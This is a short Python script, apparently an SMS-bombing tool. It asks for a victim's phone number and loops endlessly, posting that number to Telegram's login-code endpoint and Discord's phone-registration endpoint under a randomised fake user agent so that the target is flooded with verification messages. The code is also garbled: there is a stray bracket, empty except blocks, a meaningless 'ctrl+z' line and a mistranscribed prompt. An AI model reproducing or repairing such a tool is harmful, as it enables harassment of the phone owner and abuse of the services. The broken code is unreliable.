import requests, fake_useragent, time

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user})
NUMBER = input('Beeante HOMep tenedona: (6es +)')

 
while True:
 try:
     print('+')
     response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': "+" + NUMBER})
     print('=')
 except:
 try:
     print('+')
     response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, json={'phone': "+" + NUMBER})
     print('=')
 except:
	 
stop = ctrl+z
time.sleep(5000)




